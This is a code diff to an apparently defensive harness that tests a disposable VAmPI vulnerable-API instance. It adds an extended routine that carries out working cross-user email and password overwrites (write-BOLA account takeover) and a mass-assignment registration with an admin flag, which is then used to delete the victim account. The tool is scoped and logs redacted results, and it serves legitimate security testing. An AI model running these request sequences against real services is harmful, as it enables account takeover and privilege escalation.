@@ -55,7 +55,13 @@ def _random_password() -> str:
     return secrets.token_urlsafe(24)
 
 
-def _assert_request_scope(path: str, method: str, payload: dict[str, str] | None) -> None:
+def _assert_request_scope(
+    path: str,
+    method: str,
+    payload: dict[str, Any] | None,
+    *,
+    allow_extended_scope: bool = False,
+) -> None:
     allowed_operations = {
         ("GET", "/createdb"),
         ("POST", "/users/v1/register"),
@@ -67,6 +73,17 @@ def _assert_request_scope(path: str, method: str, payload: dict[str, str] | None
         return
     if method == "DELETE" and path.startswith("/users/v1/") and path.count("/") == 3 and payload is None:
         return
+    if allow_extended_scope:
+        if (method, path) == ("GET", "/me"):
+            return
+        if (
+            method == "PUT"
+            and path.startswith("/users/v1/")
+            and path.count("/") == 4
+            and path.endswith(("/password", "/email"))
+            and isinstance(payload, dict)
+        ):
+            return
     raise BflaManifestError("Disposable request falls outside the fixed BFLA workflow scope.")
 
 
@@ -76,11 +93,18 @@ def _assert_manifest_target(path: str, target: dict[str, Any]) -> None:
         raise BflaManifestError("Disposable request does not match its declared manifest target.")
 
 
-def _request(path: str, method: str, *, token: str | None = None, payload: dict[str, str] | None = None) -> tuple[int, Any]:
+def _request(
+    path: str,
+    method: str,
+    *,
+    token: str | None = None,
+    payload: dict[str, Any] | None = None,
+    allow_extended_scope: bool = False,
+) -> tuple[int, Any]:
     validate_base_url(ALLOWED_BASE_URL)
     if not path.startswith("/") or "?" in path or "#" in path:
         raise BflaManifestError("Disposable requests require exact path-only targets.")
-    _assert_request_scope(path, method, payload)
+    _assert_request_scope(path, method, payload, allow_extended_scope=allow_extended_scope)
     headers: dict[str, str] = {"Accept": "application/json"}
     body: bytes | None = None
     if token:
@@ -312,6 +336,146 @@ def execute(run_id: str, project: str, run_dir: str | Path, results_root: str | 
     result = _receipt_record(run_id, project, protected_status, protected_exists, control_status, control_exists, outcome)
     write_redacted_json(receipt_path(run_id, results_root), result)
     return result
+
+
+def extended_receipt_path(run_id: str, results_root: str | Path = "results/bfla-disposable") -> Path:
+    """Return the path for extended state-changing authorization evidence."""
+    return Path(results_root) / validate_run_id(run_id) / "extended-state-receipt.json"
+
+
+def execute_extended(
+    run_id: str, project: str, run_dir: str | Path, results_root: str | Path = "results/bfla-disposable"
+) -> dict[str, Any]:
+    """Execute state-changing Write-BOLA vs False-Positive 204 and Mass Assignment checks on :5003."""
+    run_id = validate_run_id(run_id)
+    validate_project_name(project, run_id)
+    manifest = load_manifest(manifest_path(run_id, results_root))
+    preflight_receipt, _ = _load_attested_preflight(run_id, project, results_root)
+    _assert_disposable_runtime(project, preflight_receipt["disposable_image_id"])
+    secret = _load_secret(validate_run_directory(run_dir, run_id))
+    if secret.get("run_id") != run_id:
+        raise BflaManifestError("Disposable secret run ID does not match the manifest.")
+
+    actor_username = secret["actor"].get("username", f"bfla-{run_id}-actor")
+    actor_token = secret["actor"]["token"]
+    protected = manifest["destructive_targets"][0]
+    victim_username = protected["username"]
+    victim_profile_path = protected["path"]
+    _assert_manifest_target(victim_profile_path, protected)
+
+    # 1. PUT /users/v1/{victim}/email (HTTP 204 False Positive check)
+    probe_email = f"probe-{run_id}@example.test"
+    email_status, _ = _request(
+        f"{victim_profile_path}/email",
+        "PUT",
+        token=actor_token,
+        payload={"email": probe_email},
+        allow_extended_scope=True,
+    )
+    _, victim_after_email = _request(victim_profile_path, "GET", allow_extended_scope=True)
+    _, actor_after_email = _request(f"/users/v1/{actor_username}", "GET", allow_extended_scope=True)
+    victim_email_modified = isinstance(victim_after_email, dict) and victim_after_email.get("email") == probe_email
+    actor_email_modified = isinstance(actor_after_email, dict) and actor_after_email.get("email") == probe_email
+    email_verdict = (
+        "FALSE_POSITIVE_HTTP_204_SELF_UPDATE"
+        if email_status == 204 and not victim_email_modified and actor_email_modified
+        else "WRITE_BOLA_CONFIRMED"
+        if email_status == 204 and victim_email_modified
+        else "DENIED_OR_INCONCLUSIVE"
+    )
+
+    # 2. PUT /users/v1/{victim}/password (Write-BOLA Account Takeover check)
+    takeover_pass = _random_password()
+    cred_status, _ = _request(
+        f"{victim_profile_path}/password",
+        "PUT",
+        token=actor_token,
+        payload={"password": takeover_pass},
+        allow_extended_scope=True,
+    )
+    login_status, login_body = _request(
+        "/users/v1/login",
+        "POST",
+        payload={"username": victim_username, "password": takeover_pass},
+        allow_extended_scope=True,
+    )
+    victim_taken_over = (
+        cred_status == 204
+        and login_status == 200
+        and isinstance(login_body, dict)
+        and bool(login_body.get("auth_token"))
+    )
+    cred_verdict = "WRITE_BOLA_CONFIRMED_ACCOUNT_TAKEOVER" if victim_taken_over else "DENIED_OR_INCONCLUSIVE"
+
+    # 3. POST /users/v1/register with {"admin": true} (Mass Assignment -> Privilege Escalation)
+    escalated_username = f"bfla-{run_id}-escalated"
+    escalated_pass = _random_password()
+    reg_status, _ = _request(
+        "/users/v1/register",
+        "POST",
+        payload={
+            "username": escalated_username,
+            "password": escalated_pass,
+            "email": f"{escalated_username}@example.test",
+            "admin": True,
+        },
+        allow_extended_scope=True,
+    )
+    esc_token = _login(escalated_username, escalated_pass) if reg_status in {200, 201} else ""
+    me_status, me_body = (
+        _request("/me", "GET", token=esc_token, allow_extended_scope=True) if esc_token else (None, None)
+    )
+    admin_flag_granted = (
+        me_status == 200
+        and isinstance(me_body, dict)
+        and isinstance(me_body.get("data"), dict)
+        and me_body["data"].get("admin") is True
+    )
+    esc_delete_status, _ = (
+        _request(victim_profile_path, "DELETE", token=esc_token, allow_extended_scope=True)
+        if admin_flag_granted
+        else (None, None)
+    )
+    _, victim_survived_after_esc = _profile_exists(protected)
+    mass_assignment_verdict = (
+        "MASS_ASSIGNMENT_PRIVILEGE_ESCALATION_CONFIRMED"
+        if admin_flag_granted and esc_delete_status == 200 and not victim_survived_after_esc
+        else "DENIED_OR_INCONCLUSIVE"
+    )
+
+    extended_record = {
+        "schema_version": 1,
+        "workflow": "vampi-disposable-extended-state-v1",
+        "run_id": run_id,
+        "target": ALLOWED_BASE_URL,
+        "compose_project": project,
+        "operations": {
+            "cross_user_email_update": {
+                "endpoint": "PUT /users/v1/{username}/email",
+                "status": email_status,
+                "victim_email_modified": victim_email_modified,
+                "actor_self_email_modified": actor_email_modified,
+                "verdict": email_verdict,
+            },
+            "cross_user_credential_update": {
+                "endpoint": "PUT /users/v1/{username}/password",
+                "status": cred_status,
+                "victim_account_taken_over": victim_taken_over,
+                "verdict": cred_verdict,
+            },
+            "mass_assignment_registration": {
+                "endpoint": "POST /users/v1/register",
+                "status": reg_status,
+                "admin_flag_granted": admin_flag_granted,
+                "escalated_delete_status": esc_delete_status,
+                "victim_deleted_by_escalated_user": not victim_survived_after_esc,
+                "verdict": mass_assignment_verdict,
+            },
+        },
+        "credential_or_response_bodies_exported": False,
+    }
+    write_redacted_json(extended_receipt_path(run_id, results_root), extended_record)
+    return extended_record
 
 
 def artifact_has_secret_keys(value: Any) -> bool:
